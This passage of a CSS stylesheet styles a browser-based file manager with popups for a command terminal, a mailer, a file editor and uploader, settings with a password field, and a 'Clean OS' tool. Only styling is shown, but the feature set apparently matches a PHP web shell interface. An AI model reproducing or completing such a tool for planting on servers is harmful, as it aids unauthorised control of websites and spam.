    .clean-icon .sparkle { stroke: LawnGreen; }
    .clean-icon .s1 { animation: sparkle 1.8s ease-in-out infinite; }
    .clean-icon .s2 { animation: sparkle 2.2s ease-in-out infinite; }
    .clean-icon .s3 { animation: sparkle 2.0s ease-in-out infinite; }
    .clean-icon .broom-head, .clean-icon .broom-bristle { transform-origin: 12px 12px; animation: sweep 1.6s ease-in-out infinite; }

    @keyframes sparkle {
        0% { transform: scale(0.8); opacity:0.6; }
        50% { transform: scale(1.2); opacity:1; }
        100% { transform: scale(0.8); opacity:0.6; }
    }
    @keyframes sweep {
        0% { transform: rotate(0deg); }
        50% { transform: rotate(8deg); }
        100% { transform: rotate(0deg); }
    }
    /* APPTools 1.0 app icon */
    .app-icon .apptools-icon { width:24px; height:24px; display:block; }
    #apptools-trigger .apptools-icon { color: LawnGreen; }
    .apptools-icon path, .apptools-icon circle { stroke: LawnGreen; }
    .apptools-icon .spin { transform-origin:12px 12px; animation: spin 1.4s linear infinite; }
    /* Icon tooltips for action buttons */
        .term-action[data-label], .btn-icon[data-label] { position: relative; }
        .term-action[data-label]::after, .btn-icon[data-label]::after {
            content: attr(data-label);
            position: absolute;
            left: 50%;
            transform: translateX(-50%) translateY(4px);
            bottom: -36px;
            background: #0b1320;
            color: #e2e8f0;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 4px 8px;
            font-size: 12px;
            white-space: nowrap;
            box-shadow: 0 8px 18px rgba(0,0,0,0.35);
            pointer-events: none;
            opacity: 0;
            transition: opacity .15s ease, transform .15s ease;
            z-index: 9999;
        }
        .term-action[data-label]:hover::after, .btn-icon[data-label]:hover::after {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .term-action[data-label]::before, .btn-icon[data-label]::before {
            content: "";
            position: absolute;
            left: 50%;
            bottom: -18px;
            transform: translateX(-50%);
            border: 6px solid transparent;
            border-top-color: #0b1320;
            opacity: 0;
            transition: opacity .15s ease;
            z-index: 9999;
        }
        .term-action[data-label]:hover::before, .btn-icon[data-label]:hover::before { opacity: 1; }
        /* Notes popup window */
.notes-window { position: fixed; top: 120px; left: 80px; width: min(92vw, 520px); max-height: 80vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.65); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10001; }
        .notes-window.show { display:block; }
        .notes-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .notes-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .notes-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .notes-close:hover { background: rgba(255,255,255,0.06); }
        .notes-body { padding:10px; }
        .notes-list { display:flex; flex-direction:column; gap:10px; }
        .note-item { border:1px solid var(--border); border-radius:8px; background: rgba(8,10,12,0.25); padding:8px; }
        .note-text { width:100%; min-height:120px; resize: vertical; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; box-sizing: border-box; }
        .note-text:focus { outline:none; border-color: LawnGreen; box-shadow: 0 0 0 2px rgba(124,252,0,0.18); caret-color: LawnGreen; }
        .note-actions { display:flex; align-items:center; justify-content:flex-end; gap:6px; padding-top:6px; }
        .note-actions .btn-copy { color:#ffffff; }
        .note-actions .btn-delete { color:#ff5b5b; }
        .notes-actions { display:flex; align-items:center; justify-content:space-between; gap:8px; padding:8px 10px 12px; }
        .notes-actions .btn { color:#cfd6df; }
        /* Mailer popup window */
.mailer-window { position: fixed; top: 100px; left: 60px; width: min(92vw, 580px); max-height: 85vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.65); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10001; }
        .mailer-window.show { display:block; }
        .mailer-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .mailer-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .mailer-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .mailer-close:hover { background: rgba(255,255,255,0.06); }
        .mailer-body { padding:12px; }
        .mailer-form { display:flex; flex-direction:column; gap:12px; }
        .mailer-field { display:flex; flex-direction:column; gap:4px; }
        .mailer-field label { display:flex; align-items:center; gap:6px; font-size:13px; font-weight:500; color:#e8f0f7; }
        .mailer-field label .material-symbols-rounded { font-size:18px; color: LawnGreen; }
        .mailer-field input, .mailer-field textarea { border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: inherit; }
        .mailer-field input:focus, .mailer-field textarea:focus { outline:none; border-color: LawnGreen; box-shadow: 0 0 0 2px rgba(124,252,0,0.18); caret-color: LawnGreen; }
        .mailer-format-toggle { display:flex; gap:12px; margin:4px 0; }
        .mailer-format-toggle label { display:flex; align-items:center; gap:6px; font-size:12px; cursor:pointer; }
        .mailer-format-toggle label .material-symbols-rounded { font-size:18px; color: LawnGreen; }
        .mailer-format-toggle input[type="radio"] { margin:0; accent-color: LawnGreen; }
        .mailer-actions { display:flex; align-items:center; justify-content:space-between; gap:12px; padding-top:8px; }
        /* Mailer send: icon-only button */
        .mailer-send { width:34px; height:34px; padding:0; border-radius:17px; display:inline-flex; align-items:center; justify-content:center; background: transparent; color: LawnGreen; border:1px solid LawnGreen; cursor:pointer; position:relative; }
        .mailer-send .material-symbols-rounded { font-size:22px; }
        .mailer-send:hover { background: rgba(124,252,0,0.12); box-shadow: 0 0 0 2px rgba(124,252,0,0.18); }
        .mailer-send:disabled { opacity: 0.6; cursor: not-allowed; }
        .mailer-status { font-size:12px; color:#9aa3af; }
        .mailer-output { max-height: 220px; overflow:auto; white-space: pre-wrap; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; background: rgba(6,8,10,0.22); border:1px solid var(--border); border-radius:6px; padding:8px; margin-top:8px; color:#cfd6df; }
        .mailer-output .pending { color:#9aa3af; }
        .mailer-output .ok { color:#9fd08a; }
        .mailer-output .err { color:#ff7b7b; }
        /* Hide scrollbars for all popup windows and their scrollable areas */
        .notes-window,
        .mailer-window,
        .browser-window,
        .cmd-window,
        .about-modal,
        .terminal-modal .body,
        .cmd-output,
        .mailer-output {
            -ms-overflow-style: none; /* IE and Edge */
            scrollbar-width: none;    /* Firefox */
        }
        .notes-window::-webkit-scrollbar,
        .mailer-window::-webkit-scrollbar,
        .browser-window::-webkit-scrollbar,
        .cmd-window::-webkit-scrollbar,
        .about-modal::-webkit-scrollbar,
        .terminal-modal .body::-webkit-scrollbar,
        .cmd-output::-webkit-scrollbar,
        .mailer-output::-webkit-scrollbar {
            width: 0px; height: 0px; background: transparent; /* WebKit */
        }
        /* Browser popup window */
        .browser-window { position: fixed; top: 140px; left: 100px; width: min(94vw, 860px); height: min(80vh, 600px); border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.65); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); display:none; z-index: 10000; }
        .browser-window.show { display:block; }
        .browser-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .browser-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .browser-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .browser-close:hover { background: rgba(255,255,255,0.06); }
        .browser-body { display:flex; flex-direction:column; height: calc(100% - 42px); }
        .browser-controls { display:flex; gap:8px; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.25); }
        .browser-url { flex:1; min-width:0; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; }
        .browser-go { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; text-decoration:none; display:inline-flex; align-items:center; gap:6px; }
        .browser-go:hover { background: rgba(255,255,255,0.06); }
        .browser-frame { flex:1; border:0; background:#0a0c10; }
        .browser-help { padding:6px 10px; font-size:12px; color:#9aa3af; border-top:1px solid var(--border); background: rgba(10,12,16,0.20); }
        /* Landing mode for in-app browser */
        .browser-body.landing .browser-controls,
        .browser-body.landing .browser-frame,
        .browser-body.landing .browser-help { display:none; }
        /* CMD (terminal-like) popup window */
        .cmd-window { position: fixed; top: 160px; left: 120px; width: min(92vw, 720px); height: min(76vh, 520px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 9999; }
        .cmd-window.show { display:block; }
        /* Compact CMD-style notification popup */
        .cmd-notify-window { position: fixed; top: 180px; left: 140px; width: min(92vw, 560px); max-height: 60vh; border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10002; }
        .cmd-notify-window.show { display:block; }
        .cmd-notify-body { display:flex; flex-direction:column; }
        .cmd-notify-output { padding:10px; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; white-space:pre-wrap; background: rgba(6,8,10,0.22); }
        .cmd-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.20); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .cmd-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .cmd-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .cmd-close:hover { background: rgba(255,255,255,0.06); }
        .cmd-body { display:flex; flex-direction:column; height: calc(100% - 42px); }
        .cmd-output { flex:1; padding:10px; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; overflow:auto; white-space:pre-wrap; background: rgba(6,8,10,0.22); }
        .cmd-input-row { display:flex; align-items:center; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.14); }
        .cmd-prompt { color:#9aa3af; font-family: 'Ubuntu Mono', 'Courier New', monospace; }
        .cmd-input { flex:1; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; transition: background-color .16s ease, border-color .16s ease, box-shadow .16s ease; }
        .cmd-input:hover { background: rgba(0,0,0,0.35); border-color: LawnGreen; }
        .cmd-input:focus, .cmd-input:focus-visible { outline:none; border-color: LawnGreen; background: rgba(0,0,0,0.30); box-shadow: 0 0 0 2px rgba(124,252,0,0.18); }
        .cmd-input::placeholder { color:#9aa3af; }
        .cmd-output .ok { color:#b7ff8f; }
        .cmd-output .err { color:#ff7b7b; }
        .cmd-output .sys { color:#92a3b5; }
        /* Live typing line inside terminal output */
        .cmd-live { padding:10px; }
        /* Wallpaper changer window */
.wallpaper-window { position: fixed; top: 120px; left: 80px; width: min(92vw, 520px); border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.60); backdrop-filter: blur(8px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10001; }
.wallpaper-window.show { display:block; }
        .wallpaper-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .wallpaper-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .wallpaper-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .wallpaper-close:hover { background: rgba(255,255,255,0.06); }
        .wallpaper-body { padding:12px; display:grid; grid-template-columns: 1fr auto auto; grid-auto-rows: auto; gap:8px; align-items:center; }
        .wp-url { grid-column: 1 / span 3; border:1px solid var(--border); border-radius:6px; padding:10px; background: rgba(12,14,16,0.20); color:#e8f0f7; }
        .wp-btn { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; }
        .wp-btn:hover { background: rgba(255,255,255,0.06); }
        /* Make apply icon green (logo color) and reset icon red */
        .wp-apply .material-symbols-rounded { color: LawnGreen; }
        .wp-reset .material-symbols-rounded { color: #ff3b3b; }
        .wallpaper-help { grid-column: 1 / span 3; padding-top:6px; font-size:12px; color:#9aa3af; }
        .wallpaper-footer { grid-column: 1 / span 3; padding:6px 10px; font-size:12px; color:#9aa3af; border-top:1px solid var(--border); background: rgba(10,12,16,0.20); text-align:center; }
        .cmd-live .cmd-prompt { color:#9aa3af; }
        .cmd-cursor { display:inline-block; width:10px; height:1.2em; background: LawnGreen; animation: blink 1s steps(1) infinite; vertical-align: -2px; margin-left:2px; }
        .browser-landing { flex:1; display:none; align-items:center; justify-content:center; flex-direction:column; gap:14px; padding:20px; }
        .browser-body.landing .browser-landing { display:flex; }
        .browser-landing .landing-logo { display:flex; align-items:center; gap:12px; font-weight:800; font-size:42px; letter-spacing:0.4px; color:#e6eef7; }
        .browser-landing .logo-spinner { width:36px; height:36px; }
        .browser-landing .logo-o { width:36px; height:36px; }
        .browser-landing .logo-text { font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; text-transform: uppercase; }
        .browser-landing .landing-form { display:flex; gap:8px; width:min(720px, 92%); }
        .browser-landing .landing-input { flex:1; border:1px solid var(--border); border-radius:24px; padding:12px 16px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-size: var(--textBase); }
        /* Unified green focus for popup inputs */
        .browser-landing .landing-input:focus,
        .browser-controls .browser-url:focus,
        .wallpaper-body .wp-url:focus,
        .settings-input:focus { outline:none; border-color: LawnGreen; box-shadow: 0 0 0 2px rgba(124,252,0,0.18); caret-color: LawnGreen; }
        .browser-landing .landing-submit { border:1px solid var(--border); border-radius:24px; padding:12px 18px; background: transparent; color:#cfd6df; cursor:pointer; }
        .browser-landing .landing-submit:hover { background: rgba(255,255,255,0.06); }
        .browser-landing .landing-tip { margin-top:6px; font-size:12px; color:#9aa3af; }
        .browser-landing .landing-small { font-size:12px; color:#9aa3af; letter-spacing:0.6px; text-transform: lowercase; margin-top:2px; }
        /* Clean OS popup window */
        .clean-window { position: fixed; top: 160px; left: 160px; width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10003; }
        .clean-window.show { display:block; }
        .clean-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.25); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .clean-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .clean-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .clean-close:hover { background: rgba(255,255,255,0.06); }
        .clean-body { padding:12px; display:flex; flex-direction:column; gap:10px; }
        .clean-icon-large { width:48px; height:48px; align-self:center; }
        .clean-intro { font-size:13px; color:#9aa3af; text-align:center; }
        .clean-actions { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
        .clean-actions .btn { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
        .clean-actions .btn:hover { background: rgba(255,255,255,0.06); }
        .clean-actions .btn .material-symbols-rounded { color: LawnGreen; }
        .clean-checks { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
        .clean-check { display:flex; gap:6px; align-items:center; font-size:13px; color:#cfd6df; }
        .clean-verify { border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; width: 240px; }
        .clean-result { padding:10px; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; white-space:pre-wrap; background: rgba(6,8,10,0.22); border:1px solid var(--border); border-radius:6px; }
        .clean-result .ok { color:#9fd08a; }
        .clean-result .err { color:#ff7b7b; }
        /* Editor popup window */
        .editor-window { position: fixed; top: 110px; left: 110px; width: min(94vw, 860px); height: min(80vh, 600px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
        .editor-window.show { display:block; }
        .editor-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        /* Upload and Add popups */
        .upload-window, .add-window { position: fixed; top: 120px; left: 120px; width: min(94vw, 720px); height: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
        .upload-window.show, .add-window.show { display:block; }
        .upload-titlebar, .add-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .upload-close, .add-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .upload-close:hover, .add-close:hover { background: rgba(255,255,255,0.06); }
        .editor-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
        .upload-title, .add-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        /* Inline operation status banner inside popups (centered overlay) */
        .upload-body, .add-body { position: relative; }
        .op-status { position: absolute; left:50%; top:50%; transform: translate(-50%, -50%); display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 14px; margin:0; border:1px solid rgba(255,255,255,0.10); border-radius:10px; background: rgba(0,0,0,0.28); text-align:center; z-index: 1000; max-width: 85%; box-shadow: 0 10px 22px rgba(0,0,0,0.30); }
        .op-status.ok { color:#9fd08a; }
        .op-status.err { color:#ff7b7b; }
        .editor-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .editor-close:hover { background: rgba(255,255,255,0.06); }
        .editor-body { display:flex; flex-direction:column; height: calc(100% - 42px); }
        .editor-textarea { flex:1; border:0; background: rgba(6,8,10,0.22); color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; padding:10px; resize:none; outline:none; }
        .editor-footer { display:flex; align-items:center; justify-content:flex-end; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.20); }
        .editor-save { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
        .editor-save:hover { background: rgba(255,255,255,0.06); }
        .editor-save .material-symbols-rounded { color: LawnGreen; }
        /* APPTools 1.0 popup window */
        .apptools-window { position: fixed; top: 150px; left: 140px; width: min(92vw, 640px); max-height: 80vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.62); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10004; }
        .apptools-window.show { display:block; }
        .apptools-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .apptools-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .apptools-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .apptools-close:hover { background: rgba(255,255,255,0.06); }
        .apptools-body { padding:12px; display:grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); grid-auto-rows: auto; gap:10px; }
        .apptools-card { border:1px solid var(--border); border-radius:10px; padding:12px; background: rgba(10,12,16,0.20); display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px; cursor:pointer; text-align:center; min-height:120px; }
        .apptools-card:hover { background: rgba(255,255,255,0.06); }
        .apptools-card .material-symbols-rounded { color:LawnGreen; font-size:36px; }
        .apptools-card .label { display:block; margin-top:2px; font-weight:500; font-size:13px; color:#dfe6ef; text-shadow: 0 1px 2px rgba(0,0,0,0.25); }
        h1 { font-size:18px; margin:0 0 6px; letter-spacing:0.5px; color:#cfe8d0; }
        .path { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; color:#9fb7a6; font-size:13px; }
        .container { padding:18px 24px; max-width:1100px; margin:0 auto 28px; background:rgba(10,12,16,var(--acrylic)); border:1px solid var(--border); border-top:none; border-radius:0 0 12px 12px; backdrop-filter: blur(14px) saturate(120%); box-shadow: 0 12px 40px var(--shadow); position:relative; }
        .container::after { content:""; position:absolute; left:0; right:0; bottom:0; height:22%; background: linear-gradient(0deg, rgba(122,64,152,0.22) 0%, rgba(0,0,0,0) 100%); pointer-events:none; border-radius:0 0 12px 12px; }
        table { width:100%; border-collapse: separate; border-spacing:0; }
        thead th { text-align:left; font-weight:600; color:var(--muted); font-size:12px; padding:10px 12px; border-bottom:1px solid var(--border); }
        /* Keep distinct space for columns */
        table { table-layout: fixed; width:100%; }
        thead th:nth-child(1), tbody td:nth-child(1) { width:24%; }
        thead th:nth-child(2), tbody td:nth-child(2) { width:9%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        thead th:nth-child(3), tbody td:nth-child(3) { width:8%; text-align:right; }
            thead th:nth-child(4), tbody td:nth-child(4) { width:11%; }
            /* Modified column uses grey (muted) */
            tbody td.modified { color: var(--muted); }
        thead th:nth-child(5), tbody td:nth-child(5) { width:48%; }
        /* Keep Actions in one line; scroll if overflow */
        td.actions { display:flex; align-items:center; gap:8px; flex-wrap:nowrap; white-space:nowrap; overflow:visible; }
        td.actions .btn, td.actions .btn-icon, td.actions .btn-danger { flex:0 0 auto; }
        .th-icon { font-size:14px; vertical-align:-2px; margin-right:6px; color:var(--muted); }
        tbody tr { background:transparent; border-bottom:1px dashed var(--border); }
        tbody tr:last-child { border-bottom:none; }
        tbody td { padding:10px 12px; font-size:14px; }
        tr:hover { background:rgba(255,255,255,0.04); }
        a { color:var(--accent); text-decoration: none; }
        a:hover { color:var(--accentDim); }
        .muted { color:var(--muted); }
        .actions a { margin-right:8px; }
        .actions span { margin-right:8px; color:var(--muted); }
        .material-symbols-rounded { font-variation-settings: 'FILL' 1, 'wght' 500, 'GRAD' 0, 'opsz' 24; font-size:18px; vertical-align:-3px; }
        /* Icon-only action buttons */
        .btn-icon { width:26px; height:26px; padding:0; display:inline-flex; align-items:center; justify-content:center; position:relative; }
        .btn-icon .material-symbols-rounded { vertical-align:baseline; }
        .btn.btn-danger .material-symbols-rounded { color:#ff5b5b; }
        /* Hover label for icon-only buttons */
        .btn-icon[data-label]::after { content: attr(data-label); position:absolute; left:50%; bottom: calc(100% + 8px); transform: translateX(-50%) scale(0.98); background: rgba(46,49,57,0.92); color: var(--text); border:1px solid var(--border); border-radius:8px; padding:4px 8px; font-size:12px; white-space:nowrap; box-shadow: 0 6px 14px rgba(0,0,0,0.35); opacity:0; pointer-events:none; transition: opacity .15s ease, transform .15s ease; }
        .btn-icon:hover::after { opacity:1; transform: translateX(-50%) scale(1); }
        .ic-folder { color:Moccasin; }
        /* Folder name link text should be white; keep icon color */
        .folder-link { color:#ffffff; }
        .folder-link:hover { color:#ffffff; }
        .ic-file { color:#b6f3be; }
        .ic-zip { color:#f7da9c; }
        .ic-txt { color: Khaki; }
        .fa-brands { font-size:18px; vertical-align:-3px; }
        .ic-php { color:#777bb3; }
        .ic-html { color:#e34f26; }
        .ic-js { color:#f7df1e; }
        .ic-css { color:#1572B6; }
        .btn { display:inline-block; padding:4px 9px; border:1px solid var(--border); border-radius:6px; color:var(--accent); background:transparent; }
        .btn:hover { background:rgba(255,255,255,0.05); }
        /* Icon-only buttons: square size with perfectly centered icon */
        .btn-icon { display:inline-flex; align-items:center; justify-content:center; width:26px; height:26px; padding:0; border-radius:13px; line-height:1; }
        /* Remove circular border for file actions: Download & Delete */
        .btn.btn-icon[data-label="Download"],
        .btn.btn-icon[data-label="Delete"],
        .btn.btn-icon.btn-danger[data-label="Delete"] {
            border: 0;
            background: transparent;
            box-shadow: none;
        }
        .btn.btn-icon[data-label="Download"]:hover,
        .btn.btn-icon[data-label="Delete"]:hover,
        .btn.btn-icon.btn-danger[data-label="Delete"]:hover {
            background: transparent;
        }
        .btn-danger { color:#ffd7d7; border-color:#3a1f1f; background:transparent; }
        .btn-danger:hover { background:rgba(255,0,0,0.08); }
        /* Close buttons: red X icon and visible hover tint */
        .notes-close, .mailer-close, .browser-close, .wallpaper-close, .cmd-close, .term-close, .settings-close, .editor-close, .upload-close, .add-close, .clean-close, .apptools-close { border-color: rgba(255,0,0,0.35); }
        .notes-close:hover, .mailer-close:hover, .browser-close:hover, .wallpaper-close:hover, .cmd-close:hover, .term-close:hover, .settings-close:hover, .editor-close:hover, .upload-close:hover, .add-close:hover, .clean-close:hover, .apptools-close:hover { background: rgba(255,0,0,0.08); }
        .notes-close .material-symbols-rounded,
        .mailer-close .material-symbols-rounded,
        .browser-close .material-symbols-rounded,
        .wallpaper-close .material-symbols-rounded,
        .cmd-close .material-symbols-rounded,
        .term-close .material-symbols-rounded,
        .about-close .material-symbols-rounded,
        .editor-close .material-symbols-rounded { color:#ff3b3b; }
        .upload-close .material-symbols-rounded, .add-close .material-symbols-rounded, .clean-close .material-symbols-rounded, .apptools-close .material-symbols-rounded { color:#ff3b3b; }
        /* Rename button styling: white text, green icon */
        .btn-rename { color:#ffffff; }

        /* Settings window (desktop app) */
        .settings-window { position: fixed; top: 180px; left: 140px; width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10002; }
        .settings-window.show { display:block; }
        .settings-titlebar { display:flex; align-items:center; gap:8px; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.20); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .settings-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .settings-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .settings-close .material-symbols-rounded { color:#ff3b3b; }
        .settings-body { padding:12px; display:flex; flex-direction:column; gap:10px; }
        .settings-row { display:flex; align-items:center; gap:10px; }
        .settings-row .label { width:160px; color:#aab3be; }
        .settings-input { flex:1; border:1px solid var(--border); border-radius:8px; padding:8px 10px; background: transparent; color:#cfd6df; }
        .settings-actions { display:flex; align-items:center; gap:10px; padding:10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.12); border-radius:0 0 12px 12px; }
        .settings-actions .btn { border:1px solid var(--border); border-radius:8px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
        .settings-actions .btn:hover { background: rgba(255,255,255,0.06); }
        .settings-actions .btn-save .material-symbols-rounded { color:#2ecc71; }
        .settings-actions .btn-gen .material-symbols-rounded { color:#ff9800; }
        .settings-actions .btn-copy .material-symbols-rounded { color:#9fd08a; }
        /* Settings dock icon styled like other app icons */
        .settings-row .settings-eye { width:32px; height:32px; border:1px solid var(--border); border-radius:8px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; justify-content:center; }
        .settings-row .settings-eye:hover { background: rgba(255,255,255,0.06); }
        .settings-row .settings-eye .material-symbols-rounded { font-size:20px; color:#aab3be; }
        /* Password field icons: use logo green */
		.settings-row .pw-icon { font-size:20px; color: LawnGreen; }
        /* Terminal-style toast for success/error messages */
        .term-toast { position:fixed; bottom:24px; left:24px; background:#0b0f14; color:#9fd08a; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; border:1px solid #223244; border-radius:8px; padding:10px 12px; box-shadow: 0 10px 24px rgba(0,0,0,0.45); opacity:0; transform: translateY(10px); transition: opacity .18s ease, transform .18s ease; pointer-events:none; z-index:9999; }
        .term-toast.show { opacity:1; transform: translateY(0); }
        .term-toast .prompt { color:#78c176; margin-right:6px; }
        .term-toast.error { color:#ffa8a8; border-color:#4a1d1d; }
        .term-toast .cursor { margin-left:6px; color:#78c176; animation: blink 1s step-end infinite; }
        @keyframes blink { 50% { opacity:0; } }

        /* Fullscreen overlay for terminal-style download animation */
